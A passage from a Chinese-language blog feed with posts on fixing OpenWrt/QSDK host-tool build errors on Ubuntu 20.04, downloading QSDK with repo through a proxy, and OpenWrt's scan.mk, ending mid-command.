0</code>.</p><pre><code class="patch">--- a/gnulib/lib/freadahead.c   2021-02-08 09:11:12.009710455 +0800                                                                                           +++ b/gnulib/lib/freadahead.c   2021-02-08 09:06:20.140641585 +0800                                                                                           @@ -61,6 +61,7 @@                                                                                                                                                /* fp-&gt;_Buf &lt;= fp-&gt;_Next &lt;= fp-&gt;_Rend */                                                                                                                      return fp-&gt;_Rend - fp-&gt;_Next;                                                                                                                               #else- #error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread on your system, then report this to bug-gnulib.&quot;+ //#error &quot;Please port gnulib freadahead.c to your platform! Look at the definition of fflush, fread on your system, then report this to bug-gnulib.&quot;+ return 0; #endif &#125;--- a/gnulib/lib/freading.c     2021-02-08 09:11:12.009710455 +0800+++ b/gnulib/lib/freading.c     2021-02-08 09:06:20.140641585 +0800@@ -43,7 +43,8 @@   return ((fp-&gt;_Mode &amp; 0x2 /* _MOPENW */) == 0          || (fp-&gt;_Mode &amp; 0x1000 /* _MREAD */) != 0); #else- #error &quot;Please port gnulib freading.c to your platform!&quot;+ //#error &quot;Please port gnulib freading.c to your platform!&quot;+ return 0; #endif &#125;  --- a/gnulib/lib/fpurge.c       2021-02-08 09:11:12.009710455 +0800+++ b/gnulib/lib/fpurge.c       2021-02-08 09:06:20.140641585 +0800@@ -114,7 +114,8 @@     fp-&gt;_Rend = fp-&gt;_Next;   return 0; # else- #error &quot;Please port gnulib fpurge.c to your platform! Look at the definitions of fflush, setvbuf and ungetc on your system, then report this to bug-gnulib.&quot;+ //#error &quot;Please port gnulib fpurge.c to your platform! Look at the definitions of fflush, setvbuf and ungetc on your system, then report this to bug-gnulib.&quot;+ return 0; # endif   #endif--- a/gnulib/lib/fseeko.c       2021-02-08 09:11:12.009710455 +0800+++ b/gnulib/lib/fseeko.c       2021-02-08 09:06:20.140641585 +0800@@ -95,7 +95,7 @@       &amp;&amp; fp-&gt;_Rback == fp-&gt;_Back + sizeof (fp-&gt;_Back)       &amp;&amp; fp-&gt;_Rsave == NULL) #else-  #error &quot;Please port gnulib fseeko.c to your platform! Look at the code in fpurge.c, then report this to bug-gnulib.&quot;+  //#error &quot;Please port gnulib fseeko.c to your platform! Look at the code in fpurge.c, then report this to bug-gnulib.&quot; #endif     &#123;       off_t pos = lseek (fileno (fp), offset, whence);</code></pre><p><code>make tools/findutils/&#123;clean,compile&#125; V=s</code> 编译成功！</p><h3 id="squashfs4"><a href="#squashfs4" class="headerlink" title="squashfs4"></a>squashfs4</h3><p><code>squashfs4</code> 的错误信息与 <code>make-ext4fs</code> 等类似，也是缺少头文件 <code>&lt;sys/sysmacros.h&gt;</code>.</p><pre><code class="log">mksquashfs.c: In function &#39;create_inode&#39;:mksquashfs.c:1372:24: error: called object &#39;major&#39; is not a function or function pointer 1372 |   unsigned int major = major(buf-&gt;st_rdev);      |                        ^~~~~</code></pre><p>把头文件加上就好了。</p><pre><code class="patch">--- a/squashfs-tools/mksquashfs.c       2021-02-08 10:08:42.135709202 +0800+++ b/squashfs-tools/mksquashfs.c       2021-02-08 10:09:03.263649419 +0800@@ -52,6 +52,7 @@ #include &lt;regex.h&gt; #include &lt;fnmatch.h&gt; #include &lt;sys/wait.h&gt;+#include &lt;sys/sysmacros.h&gt;  #ifndef linux #ifndef __CYGWIN__--- a/squashfs-tools/unsquashfs.c       2021-02-08 10:08:48.335691509 +0800+++ b/squashfs-tools/unsquashfs.c       2021-02-08 10:09:24.919589603 +0800@@ -30,6 +30,7 @@ #include &quot;xattr.h&quot;  #include &lt;sys/types.h&gt;+#include &lt;sys/sysmacros.h&gt;  struct cache *fragment_cache, *data_cache; struct queue *to_reader, *to_deflate, *to_writer, *from_writer;</code></pre><p><code>make tools/squashfs4/&#123;clean,compile&#125; V=s</code> 编译成功！</p><h3 id="coccinelle"><a href="#coccinelle" class="headerlink" title="coccinelle"></a>coccinelle</h3><p><code>coccinelle</code> 依赖 <code>ocaml</code>, 而且版本不一样会编译出错，当前 <code>QSDK</code> 所用的<code>ocaml</code>版本较低，为 <code>4.02.3</code>, 但是本机默认安装的却是 <code>4.08.1</code>, 所以需要重新降级安装，参考 <a href="https://www.izheteng.site/2020/04/03/2020-04-03-Ubuntu18-04%E4%B8%8B%E7%BC%96%E8%AF%91OpenWRT15-05%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/#7-%E7%BC%96%E8%AF%91coccinelle-1-0-0-rc24c%E5%87%BA%E9%94%99">这里</a> 给出的解决方案。</p><pre><code class="bash"># install opamsudo add-apt-repository ppa:avsm/ppa # 或许可以省略sudo apt updatesudo apt install opam# environment setupopam initeval `opam env`# install given version of the compileropam switch create 4.02.3eval `opam env`# check you got what you wantwhich ocamlocaml -version</code></pre><p>然后重新编译 <code>coccinelle</code>, 发现会提示找不到 <code>ocamlfind</code> ，这时再用刚刚安装的 <code>opam</code> 安装一下就好了。</p><pre><code class="bash">opam install ocamlfind</code></pre><blockquote><p>下载和使用 <code>opam</code> 过程中会通过 <code>curl</code> 指令从网络下载数据，所以可能比较慢，需要耐心等待。</p></blockquote><p>之后重新编译 <code>coccinelle</code> 就成功啦。</p><h3 id="bazel"><a href="#bazel" class="headerlink" title="bazel"></a>bazel</h3><p><code>Bazel</code> 依赖一些第三方库，比如 <code>grpc.git</code> ，由于 Glibc 版本原因，<code>grpc</code> 定义的 <code>gettid</code> 函数与库函数产生了冲突。</p><pre><code class="log">Execution platform: @bazel_tools//platforms:host_platformthird_party/grpc/src/core/support/log_linux.c:57:13: error: conflicting types for &#39;gettid&#39;   57 | static long gettid(void) &#123; return syscall(__NR_gettid); &#125;      |             ^~~~~~In file included from /usr/include/unistd.h:1170,                 from third_party/grpc/src/core/support/log_linux.c:55:/usr/include/x86_64-linux-gnu/bits/unistd_ext.h:34:16: note: previous declaration of &#39;gettid&#39; was here   34 | extern __pid_t gettid (void) __THROW;      |                ^~~~~~Target //src:bazel_nojdk failed to buildINFO: Elapsed time: 43.689s, Critical Path: 0.74sINFO: 22 processes: 22 local.FAILED: Build did NOT complete successfully</code></pre><p>参考 <code>grpc</code> 官方 <a href="https://github.com/grpc/grpc/pull/18950/commits/57586a1ca7f17b1916aed3dea4ff8de872dbf853">fix solution</a> , 需要将 <code>log_linux.c</code> 中的 <code>gettid</code> 改为 <code>sys_gettid</code>.</p><pre><code class="patch">diff --git a/tools/bazel/Makefile b/tools/bazel/Makefileindex 971270fadb33..74ba38be40d0 100644--- a/tools/bazel/Makefile+++ b/tools/bazel/Makefile@@ -14,6 +14,7 @@ include $(INCLUDE_DIR)/host-build.mk  export JAVA_HOME=$(STAGING_DIR_HOST)/bin/openjdk-1.8-native define Host/Compile+       sed -i &#39;s/gettid/sys_gettid/&#39;  $(HOST_BUILD_DIR)/../third_party/grpc/src/core/support/log_linux.c        $(HOST_BUILD_DIR)/../compile.sh endef</code></pre><p>这里需要说明的是，为什么这里不在 <code>tools/bazel/patches</code> 添加补丁，而是在 Makefile 里直接修改文件。这是因为 <code>bazel</code> 本身包含大量的第三方库，这些库的所在目录与 <code>bazel</code> 本身编译目录并不相同。</p><pre><code class="log"># bazel 编译目录build_dir/host/bazel-0.23.2-dist/bazel-0.23.2/# third parthbuild_dir/host/bazel-0.23.2-dist/third_party/</code></pre><p>我尝试在 patches 添加补丁，并以相对路径 <code>../third_party</code> 访问第三方库，但是在 apply patch 的时候会报错，提示找不到文件，我猜测应该是补丁文件不支持相对路径。尝试多次无果，最终决定通过修改 Makefile 实现对第三方库文件的修改。事实证明，以上修改完美解决了问题。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>纵观以上所有的编译问题，大致分为以下几类：</p><ol><li>缺少宏定义<ol><li><code>m4</code>: <code>_IO_ftrylockfile</code> -&gt; <code>_IO_EOF_SEEN</code></li><li><code>findutils</code></li></ol></li><li>缺少头文件 <code>&lt;sys/sysmacros.h&gt;</code><ol><li><code>make-ext4fs</code></li><li><code>e2fsprogs</code></li><li><code>mtd-utils</code></li><li><code>squashfs4</code></li></ol></li><li>依赖工具版本不兼容<ol><li><code>u-boot</code>: 依赖 <code>libssl1.0-dev</code></li><li><code>coccinelle</code>: 依赖 <code>ocaml 4.02.3</code></li></ol></li><li>第三方库冲突<ol><li><code>bazel</code>: 依赖的 <code>grpc</code> 定义的函数 <code>gettid</code> 与 GLIBC 库函数冲突</li></ol></li></ol><p>实际上大部分问题还是与编译环境有关，编译环境是 Ubuntu 20.04, 所用的工具版本较新，与 <code>QSDK</code> 所需的旧版本不完全兼容，所以导致了各种编译错误。这时候感觉使用 <code>docker</code> 搭建编译环境或许更方便。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>为了方便编译过程的正常进行，可以修改某些文件或者添加脚本简化编译过程。</p><h3 id="修改-distclean"><a href="#修改-distclean" class="headerlink" title="修改 distclean"></a>修改 distclean</h3><p>有时候我们会使用 <code>make distclean</code> 清除整个编译信息，但是这个指令会将 <code>dl</code> 中的下载数据和 <code>.config</code> 文件一同删除，这是我们不希望的。所以可以修改 <code>distclean</code> 对应的指令。这个指令在 <code>include/toplevel.mk</code>. 修改如下：</p><pre><code class="patch">diff --git a/include/toplevel.mk b/include/toplevel.mkindex 3738dbb89eec..508e67e3384f 100644--- a/include/toplevel.mk+++ b/include/toplevel.mk@@ -222,7 +222,7 @@ docs/clean: FORCE        @$(_SINGLE)$(SUBMAKE) -C docs clean  distclean: clean_kernel-       rm -rf tmp build_dir staging_dir dl .config* feeds package/feeds package/openwrt-packages bin+       rm -rf tmp build_dir staging_dir feeds package/feeds package/openwrt-packages bin        @$(_SINGLE)$(SUBMAKE) -C scripts/config clean  ifeq ($(findstring v,$(DEBUG)),)</code></pre><h3 id="添加-build-sh"><a href="#添加-build-sh" class="headerlink" title="添加 build.sh"></a>添加 build.sh</h3><p>为了方便编译，可以在 <code>scripts</code> 目录添加脚本 <code>build.sh</code></p><pre><code class="bash">#!/bin/bashcp qca/configs/qsdk/ipq_open.config .configecho CONFIG_TARGET_ipq_ipq807x_64=y &gt;&gt; .configecho CONFIG_TARGET_ipq_ipq807x_64_QSDK_Open=y &gt;&gt; .configmake package/symlinksmake defconfigmake V=s</code></pre><p>将编译相关的指令都放一起，然后执行 <code>scripts/build.sh</code> 就好了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://sites.uclouvain.be/SystInfo/usr/include/sys/sysmacros.h.html">sys/sysmacros.h</a></li><li><a href="https://www.izheteng.site/2020/04/03/2020-04-03-Ubuntu18-04%E4%B8%8B%E7%BC%96%E8%AF%91OpenWRT15-05%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">Ubuntu18.04下编译OpenWRT15.05遇到的问题和解决方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openwrt </tag>
            
            <tag> qsdk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>下载安装基于 openwrt 的 QSDK</title>
      <link href="2021/01/29/qsdk/"/>
      <url>2021/01/29/qsdk/</url>
      
        <content type="html"><![CDATA[<p><code>QSDK</code> - QCA Software Development Kits, 基于 openwrt 加入了 QCA 相关的代码库，可以用于使用 qualcomm 芯片的路由器固件开发。本文讲述如何获取 QSDK.</p><p>我们通常会使用 <code>git clone</code> 获取开源项目的代码，比如 github, gitlab, coding 等平台，但是 <code>QSDK</code> 并不存放于这些平台，而是有它自己的维护站点，并且需要通过 <code>repo</code> 和 <code>git</code> 共同完成仓库文件的 <code>clone</code>, 下面来看看吧。</p><h2 id="install-repo"><a href="#install-repo" class="headerlink" title="install repo"></a>install repo</h2><p>首先来安装 <code>repo</code> 工具，这其实是个 <code>Python</code> 脚本.</p><pre><code class="bash">curl https://storage.googleapis.com/git-repo-downloads/repo -o repochmod +x repomv repo ~/bin/</code></pre><p>也可以手动下载：<a href="https://gerrit.googlesource.com/git-repo/">https://gerrit.googlesource.com/git-repo/</a></p><h2 id="install-qsdk"><a href="#install-qsdk" class="headerlink" title="install qsdk"></a>install qsdk</h2><p>下载完 <code>repo</code> 后，在 <code>git</code> 已经安装并配置好了基本的 <code>email</code>, <code>username</code> 的情况下就可以开始下载 <code>QSDK</code> 了。</p><ul><li><code>QSDK</code> 官方仓库： <a href="https://source.codeaurora.org/quic/cc-qrdk/releases/manifest/qstak/">https://source.codeaurora.org/quic/cc-qrdk/releases/manifest/qstak/</a></li><li><code>IPQ806x</code> 对应 <code>manifest</code>: caf_AU_LINUX_QSDK_NHSS.QSDK.11.0_TARGET_ALL.11.0.3821.3949.xml</li></ul><p>不同型号的芯片对应不同的 <code>manifest</code> 文件，这是一个 <code>xml</code> 文件，有点类似 <code>Android</code> 开发的 <code>mainfest.xml</code>.</p><p>关于 <code>QSDK</code> 的 <code>manifest</code>, 可以参考下表，源自 <a href="https://wiki.codeaurora.org/xwiki/bin/viewrev/QSDK/WebHome?rev=13.1">https://wiki.codeaurora.org/xwiki/bin/viewrev/QSDK/WebHome?rev=13.1</a></p><table><thead><tr><th>OpenWrt Version</th><th>Kernel Version</th><th>SoC&#39;s</th><th>Latest Available  Release Branch Example Version</th><th>Notes</th></tr></thead><tbody><tr><td>15.05</td><td>3.14</td><td>ipq806x,ipq40xx</td><td>caf_AU_LINUX_QSDK_NHSS.QSDK.6.1.0.R1_TARGET_ALL.0.1.2028.020.xml</td><td>with uClibc</td></tr><tr><td>15.05</td><td>4.4</td><td>ipq806x, ipq40xx</td><td>caf_AU_LINUX_QSDK_NHSS.QSDK.6.1.1.R1_TARGET_ALL.3.0.308.00.1591.020.xml</td><td>with uClibc</td></tr><tr><td>15.05</td><td>4.4</td><td>ipq806x, ipq40xx, ipq807x, ipq807x_64</td><td>caf_AU_LINUX_QSDK_NHSS.QSDK.11.0_TARGET_ALL.11.0.3821.3949.xml</td><td>with MuslWi-Fi not available</td></tr></tbody></table><p>使用 <code>repo</code> 尝试下载：</p><pre><code class="bash">$ repo init -u git://source.codeaurora.org/quic/cc-qrdk/releases/manifest/qstak -b release -m caf_AU_LINUX_QSDK_NHSS.QSDK.11.0_TARGET_ALL.11.0.3821.3949.xmlDownloading Repo source from https://gerrit.googlesource.com/git-repofatal: Cannot get https://gerrit.googlesource.com/git-repo/clone.bundlefatal: error Tunnel connection failed: 502 Parent proxy unreacheable</code></pre><p>fail 了，这是 Google 网络被墙的问题，为此我通过 <code>v2ray</code> + <code>proxychians4</code> 代理解决了。</p><ul><li><code>v2ray</code>: 订阅配置，需要梯子，可以网上自行搜索免费的，或者自行购买搭建。</li><li><code>proxychains4</code>：可以方便配置 <code>socks5</code> 网络代理，配置说明参考 <a href="https://www.litreily.top/notes/network/proxychains4/">proxychains4</a>.</li></ul><p>在linux系统下，可以使用 <code>Qv2ray</code> 替代 <code>V2rayN</code>, 但是都需要安装 <code>v2ray-core</code> 的支持。关于 <code>Qv2ray</code> 可以参考</p><ul><li><a href="https://medium.com/@eleveninstrangerthings/%E5%9C%A8ubuntu%E4%B8%8A%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E5%8C%96v2ray%E5%AE%A2%E6%88%B7%E7%AB%AFqv2ray-d0f690b7c519">在Ubuntu上安装图形化v2Ray客户端Qv2Ray</a></li></ul><p>方便起见，可以在 <code>.zshrc</code> 或者 <code>.bashrc</code> 中添加一个 <code>proxychains4</code> 的 alias.</p><pre><code class="bash">alias supro=&quot;sudo proxychains4&quot;</code></pre><p>网络代理不是本文重点，其目的是保证可以正常访问谷歌网络。下面使用 <code>repo</code> 进行 <code>QSDK</code> 的下载。</p><pre><code class="bash">supro ~/bin/repo init -u git://codeaurora.org/quic/qsdk/releases/manifest/qstak -b release -m caf_AU_LINUX_QSDK_NHSS.QSDK.11.0_TARGET_ALL.11.0.3821.3949.xmlsupro ~/bin/repo sync</code></pre><p>下载速度依网络情况而定，毕竟用的代理，访问的是 <code>Google</code>， 所以速度你懂的。而且 <code>sync</code> 数据量非常大，所以下载时间会非常非常非常长。。。先去干别的吧。</p><pre><code class="log">➜ supro ~/bin/repo sync[proxychains] config file found: /etc/proxychains4.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  codeaurora.org:9418  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14Fetching projects:   1% (1/55) quic/qsdk/oss/tools/meta[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14remote: Enumerating objects: 101, done.        remote: Counting objects: 100% (101/101), done.        remote: Compressing objects: 100% (60/60), done.        [proxychains] DLL init: proxychains-ng 4.14remote: Total 4239698 (delta 31), reused 98 (delta 31), pack-reused 4239597        Receiving objects: 100% (4239698/4239698), 1.04 GiB | 3.38 MiB/s, done.Resolving deltas: 100% (3317886/3317886), done.[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14Fetching projects:   3% (2/55) quic/qsdk/oss/system/openwrt[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14Fetching projects:   5% (3/55) quic/qsdk/oss/releases/configs/qca955x[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14Fetching projects:   7% (4/55) quic/qsdk/oss/releases/configs/qsdk[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14Fetching projects:   9% (5/55) quic/qsdk/oss/system/feeds/platform/bootloader[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain  ...  127.0.0.1:1080  ...  source.codeaurora.org:443  ...  OK[proxychains] DLL init: proxychains-ng 4.14[proxychains] DLL init: proxychains-ng 4.14#...Checking out projects:  89% (49/55) quic/qsdk/oss/lklm/shortcut-fe[proxychains] DLL init: proxychains-ng 4.14Updating files: 100% (11323/11323), done.Checking out projects:  90% (50/55) quic/qsdk/oss/boot/u-boot-2016[proxychains] DLL init: proxychains-ng 4.14Checking out projects:  92% (51/55) quic/qsdk/oss/wigig-utils[proxychains] DLL init: proxychains-ng 4.14Checking out projects:  94% (52/55) quic/qsdk/oss/wireshark[proxychains] DLL init: proxychains-ng 4.14Updating files: 100% (6135/6135), done.Checking out projects:  96% (53/55) quic/qsdk/oss/wireshark-github[proxychains] DLL init: proxychains-ng 4.14Checking out projects:  98% (54/55) quic/qsdk/oss/tools/skales[proxychains] DLL init: proxychains-ng 4.14Checking out projects: 100% (55/55), done.repo sync has finished successfully.</code></pre><p>总算下载完了，来看看根目录有哪些东西。</p><pre><code class="log">➜  tree -L 1.├── meta-scripts├── qsdk├── skales└── tools4 directories, 0 files➜  tree qsdk -L 1qsdk├── BSDmakefile├── config├── Config.in├── docs├── feeds.conf├── feeds.conf.default├── include├── LICENSE├── Makefile├── package├── qca├── README├── rules.mk├── scripts├── target├── toolchain├── tools├── wireshark-2.4.2-11ax-patches└── wireshark-github11 directories, 8 files➜  qsdk du -h -d2 496K    ./tools/ubi32-nssmconf500K    ./tools36K     ./skales/.git8.0K    ./skales/initrds12K     ./skales/atag-fix52K     ./skales/boards176K    ./skales36K     ./meta-scripts/yocto16K     ./meta-scripts/Parser40K     ./meta-scripts/.git56K     ./meta-scripts/ipq806x_deluxe48K     ./meta-scripts/ipq40xx_premium20K     ./meta-scripts/ipq806x_open60K     ./meta-scripts/ipq806x_standard16K     ./meta-scripts/ipq40xx_standard332K    ./meta-scripts516M    ./.repo/projects7.2M    ./.repo/repo11G     ./.repo/project-objects24M     ./.repo/manifests4.0M    ./.repo/manifests.git12G     ./.repo132K    ./qsdk/docs37M     ./qsdk/target2.8M    ./qsdk/tools840K    ./qsdk/.git1012K   ./qsdk/scripts225M    ./qsdk/wireshark-github1.1G    ./qsdk/qca152K    ./qsdk/wireshark-2.4.2-11ax-patches320K    ./qsdk/include48K     ./qsdk/config1.5M    ./qsdk/toolchain22M     ./qsdk/package1.4G    ./qsdk13G     .</code></pre><p>没错，<code>13G</code>，下了快一天。<code>qsdk</code> 目录就是我们所需的了。</p><pre><code class="log">➜  qsdk git:(35ebd114e275) ls -FBSDmakefile         include/   rules.mk      tools/config/             LICENSE    scripts/      wireshark-2.4.2-11ax-patches/Config.in           Makefile   staging_dir/  wireshark-github/docs/               package/   target/feeds.conf          qca/       tmp/feeds.conf.default  README     toolchain/</code></pre><p>看起来确实和 <code>openwrt</code> 的目录结构挺像的。不过多了两个 <code>wireshark</code> 相关的目录。</p><p>关于 <code>QSDK</code> 的下载就讲完了，这里再说明下编译需要一些依赖工具，比如下面这些。</p><ul><li><code>ocaml-nox</code>: Objective Caml compiler for GUI of <code>make menuconfig</code></li><li><code>zlib1g-dev</code>: for <code>zlib</code></li><li><code>libssl-dev</code>: for <code>openssl</code></li><li><code>subversion</code>: for <code>svn</code></li></ul><p>具体编译相关的后续再说。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://wiki.codeaurora.org/xwiki/bin/QSDK/">QSDK wiki</a></li><li><a href="https://blog.csdn.net/Q_lming/article/details/51870130">repo下载QSDK代码全记录 - csdn</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openwrt </tag>
            
            <tag> qsdk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openwrt Makefile scan.mk 详解</title>
      <link href="2021/01/15/mk-scan/"/>
      <url>2021/01/15/mk-scan/</url>
      
        <content type="html"><![CDATA[<p><code>openwrt</code> 中的 <code>include/scan.mk</code> 用于扫描项目 <code>package</code>, <code>target</code> 目录信息，并将扫描结果存入 <code>tmp</code> 目录。这个扫描过程几乎是 openwrt 所有目标生成的前提。也就是说，无论使用 <code>make</code> 编译 <code>openwrt</code> 哪个部分的代码，都会通过 <code>scan.mk</code> 生成必要的临时文件，这是编译其它目录的大前提。</p><p>举例说明，我们指定编译某个 <code>package</code> 时，如 <code>package/utils/demo</code>，<code>make</code> 根据层层 <code>Makefile</code> 会去寻找该 <code>package</code> 的路径，而这个路径信息就是通过 <code>scan.mk</code> 扫描后存入了 <code>tmp</code> 目录。这样有什么好处呢? 我完全可以手动执行 <code>make package/utils/demo/compile</code> 不是吗？</p><p>的确如此，但是我们不可能每次都去写长串的路径，通过 <code>tmp</code> 目录的信息，不管 <code>package</code> 对应目录在哪， <code>package/demo</code> 也好， <code>package/utils/demo</code> 也罢， <code>package/utils/test/demo</code> 也无所谓，我们都可以执行 <code>make package/demo/compile</code> 进行编译，<code>make</code> 会根据 <code>tmp</code> 目录里保存的映射关系自动查找到对应目录，非常方便。</p><p><code>openwrt</code> 的 <code>Makefile</code> 体系非常庞大，通过首次生成 <code>package</code>、<code>target</code> 信息到 <code>tmp</code> 目录，可以简化编译流程，节省编译时间。这篇文章就来详细讲述一下 <code>scan.mk</code> 的扫描过程。</p><h2 id="prepare-tmpinfo"><a href="#prepare-tmpinfo" class="headerlink" title="prepare-tmpinfo"></a>prepare-tmpinfo</h2><p>在讲述 <code>scan.mk</code> 之前，我们需要知道 <code>scan.mk</code> 在哪里被调用到，答案是 <code>toplevel.mk</code> 的 <code>prepare-tmpinfo</code> 目标，这个目标几乎是 <code>toplevel.mk</code> 中其它目标都会包含的依赖项。<code>defconfig</code>, <code>oldconfig</code>, <code>menuconfig</code>, <code>prereq</code>, <code>config</code> 等都会依赖它。</p><p>顾名思义，<code>prepare-tmpinfo</code> 就是用来准备 <code>tmp</code> 信息的，它没有依赖项，<code>FORCE</code> 代表强制执行其指令。在它的指令中就会调用到 <code>scan.mk</code> 了。</p><pre><code class="makefile">prepare-tmpinfo: FORCE    @+$(MAKE) -r -s staging_dir/host/.prereq-build $(PREP_MK)    mkdir -p tmp/info    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;    for type in package target; do \        f=tmp/.$$&#123;type&#125;info; t=tmp/.config-$$&#123;type&#125;.in; \        [ &quot;$$t&quot; -nt &quot;$$f&quot; ] || ./scripts/$$&#123;type&#125;-metadata.pl $(_ignore) config &quot;$$f&quot; &gt; &quot;$$t&quot; || &#123; rm -f &quot;$$t&quot;; echo &quot;Failed to build $$t&quot;; false; break; &#125;; \    done    [ tmp/.config-feeds.in -nt tmp/.packageauxvars ] || ./scripts/feeds feed_config &gt; tmp/.config-feeds.in    ./scripts/package-metadata.pl mk tmp/.packageinfo &gt; tmp/.packagedeps || &#123; rm -f tmp/.packagedeps; false; &#125;    ./scripts/package-metadata.pl pkgaux tmp/.packageinfo &gt; tmp/.packageauxvars || &#123; rm -f tmp/.packageauxvars; false; &#125;    ./scripts/package-metadata.pl usergroup tmp/.packageinfo &gt; tmp/.packageusergroup || &#123; rm -f tmp/.packageusergroup; false; &#125;    touch $(TOPDIR)/tmp/.build</code></pre><p>其中有两行调用了 <code>scan.mk</code>.</p><pre><code class="makefile">    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;    $(_SINGLE)$(NO_TRACE_MAKE) -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;</code></pre><p>通过分析主 Makefile 和 include/verbose.mk 可以知道 <code>$(_SINGLE)$(NO_TRACE_MAKE)</code> 对应的是：</p><pre><code class="bash">export MAKEFLAGS= ;make V=ss</code></pre><p>那么以上指令解析后就是：</p><pre><code class="bash">export MAKEFLAGS= ;make V=ss -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;export MAKEFLAGS= ;make V=ss -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;targetinfo&quot; SCAN_DIR=&quot;target/linux&quot; SCAN_NAME=&quot;target&quot; SCAN_DEPTH=2 SCAN_EXTRA=&quot;&quot; SCAN_MAKEOPTS=&quot;TARGET_BUILD=1&quot;</code></pre><blockquote><p><strong>说明：</strong> make 的 <code>-s</code> 指令代表 silent， 会将所有输出都屏蔽掉，我们在分析的时候可以把 <code>-s</code> 去掉，并换成 <code>-d</code> ，这样可以看到更详细的 log.</p></blockquote><p>好啦，现在知道 scan.mk 的入口啦，就是 <code>prepare-tmpinfo</code> 的指令之一。那么我们怎么触发这两条指令呢？很简单，因为只要执行make就会调用这个依赖，我们可以通过 <code>make defconfig</code> 触发，为了获取更详细的信息，可以使用以下指令：</p><pre><code class="bash">make -d V=s DEBUG=dtlrv defconfig &gt; log 2&gt;&amp;1</code></pre><p>这样就将编译信息保存到文件 log 中了，方便分析执行过程。<a href="https://www.litreily.top/2020/12/29/make-defconfig/">make defconfig</a> 的主要流程在之前已有文章单独讲述过，不再赘述，本文主要来分析</p><pre><code class="bash">make V=ss -j1 -r -s -f include/scan.mk SCAN_TARGET=&quot;packageinfo&quot; SCAN_DIR=&quot;package&quot; SCAN_NAME=&quot;package&quot; SCAN_DEPTH=5 SCAN_EXTRA=&quot;&quot;</code></pre><p>这条指令的执行过程，以深入理解 openwrt scan.mk 的扫描过程。</p><blockquote><p>当然，我们也可以直接调用以上指令，而不用 <code>make defconfig</code>, 只不过需要添加两个全局变量<br>-- <code>SCAN_COOKIE=&quot;123456&quot;</code><br>-- <code>TOPDIR=&quot;/home/litreily/openwrt&quot;</code></p></blockquote><pre><code class="bash">make V=ss -j1 -r -d -f include/scan.mk 